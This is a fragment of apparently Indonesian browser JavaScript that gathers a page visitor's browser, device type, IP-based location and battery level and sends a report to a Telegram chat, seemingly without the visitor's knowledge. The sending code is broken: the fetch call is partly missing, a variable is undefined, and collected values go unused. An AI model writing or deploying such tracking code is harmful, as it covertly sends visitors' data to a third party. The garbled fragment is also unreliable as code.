function getBrowserName() {
  const ua = navigator.userAgent;
  if (ua.includes("Chrome") && !ua.includes("Edg")) return "Google Chrome";
  if (ua.includes("Firefox")) return "Mozilla Firefox";
  if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
  if (ua.includes("Edg")) return "Microsoft Edge";
  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
  return "Unknown Browser";
}

async function sendToTelegram(){
  try{

    // Geo
    const geoRes = await fetch(`https://ipapi.co/${ip.ip}/json/`);
    const geo = await geoRes.json();

    // Device
    const device = /Android/i.test(navigator.userAgent)
      ? "Android"
      : /iPhone|iPad/i.test(navigator.userAgent)
      ? "iOS"
      : "Desktop";

    // Battery
    let batteryText = "N/A";
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryText = Math.round(battery.level * 100) + "%";
    }

    const browser = getBrowserName();

    const message = `

‚è∞ Jam : ${new Date().toLocaleString()}
üì± Device : ${device}
üîã Baterai : ${batteryText}

    `;

      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });

  } catch(e) {
    console.log("Gagal kirim telegram", e);
  }
}
